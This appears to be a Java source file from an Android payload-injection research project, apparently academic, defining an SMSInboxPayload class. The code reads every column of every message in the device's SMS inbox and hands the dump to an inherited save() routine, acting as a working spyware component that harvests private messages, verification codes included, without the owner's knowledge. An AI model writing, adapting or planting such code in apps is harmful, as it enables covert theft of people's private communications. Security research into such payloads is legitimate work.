package it.unisannio.srss.dame.payloads.smsInbox;

import it.unisannio.srss.dame.payloads.Payload;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;

public class SMSInboxPayload extends Payload {

	public SMSInboxPayload(Context context) {
		super(context);
	}

	@Override
	public void run() {
		Uri smsInbox = Telephony.Sms.Inbox.CONTENT_URI;
		ContentResolver cr = context.getContentResolver();
		Cursor cursor = cr.query(smsInbox, null, null, null, null);
		cursor.moveToFirst();
		String msgData = "";
		do {
			msgData += "\n";
			for (int i = 0; i < cursor.getColumnCount(); i++) {
				msgData += " " + cursor.getColumnName(i) + ":"
						+ cursor.getString(i) + "\n";
			}
		} while (cursor.moveToNext());
		if (save(msgData))
			Log.i(tag, "Sms inbox saved successful");
		else
			Log.e(tag, "Error while saving the payload output.");
	}
}
